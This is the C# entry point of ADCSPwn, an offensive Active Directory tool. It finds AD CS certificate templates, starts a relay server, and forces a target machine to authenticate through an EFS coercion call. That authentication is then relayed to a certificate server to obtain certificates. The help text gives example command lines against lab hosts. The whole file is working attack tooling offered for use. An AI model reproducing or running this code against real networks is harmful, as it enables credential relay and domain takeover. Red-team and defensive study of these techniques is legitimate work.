using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ADCSPwn
{
    class Program
    {
        static void ShowHelp()
        {
            Console.WriteLine("adcspwn.exe --adcs <cs server> --port [local port] --remote [computer]\n");

            Console.WriteLine("Required arguments:");
            Console.WriteLine("adcs\t\t-\tThis is the address of the AD CS server which authentication will be relayed to.");

            Console.WriteLine("\nOptional arguments:");
            Console.WriteLine("port\t\t-\tThe port ADCSPwn will listen on.");
            Console.WriteLine("remote\t\t-\tRemote machine to trigger authentication from.");

            Console.WriteLine("\nExample usage:");
            Console.WriteLine("adcspwn.exe --adcs cs.pwnlab.local");
            Console.WriteLine("adcspwn.exe --adcs cs.pwnlab.local --port 9001");
            Console.WriteLine("adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local");
            Console.WriteLine("adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001");
        }

        static void ShowBanner()
        {
            Console.WriteLine(Config.banner);
            Console.WriteLine("Author: @_batsec_ - MDSec ActiveBreach\n");
        }

        static void ParseArgs(string[] args)
        {
            int iter = 0;
            foreach (string item in args)
            {
                switch (item)
                {
                    case "--port":
                        Config.port = int.Parse(args[iter + 1]);
                        break;
                    case "--adcs":
                        Config.adcs = args[iter + 1];
                        break;
                    case "--remote":
                        Config.machine = args[iter + 1];
                        break;
                    default:
                        break;
                }

                ++iter;
            }
        }


        static void Main(string[] args)
        {
            ShowBanner();

            if (args.Length < 2)
            {
                ShowHelp();
                return;
            }

            ParseArgs(args);

            TemplateHunter templatehunter = new TemplateHunter();

            try
            {
                String[] templates = templatehunter.FindAll();

                int certcount = 0;
                for (int i = 0; i < templates.Length; i++)
                {
                    if (templates[i] != null)
                    {
                        ++certcount;
                    }
                }

                Console.WriteLine("[i] Found "+certcount+" certificate templates");

                RelayServer relayserver = new RelayServer();
                relayserver.Initialize(templates);

                Console.WriteLine("[i] Triggering authentication from target ({0})\n", Config.machine);

                EFSTrigger.CoerceMachineAuth(Config.machine);

                while (true)
                {
                    Thread.Sleep(10000);
                    continue;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
    }
}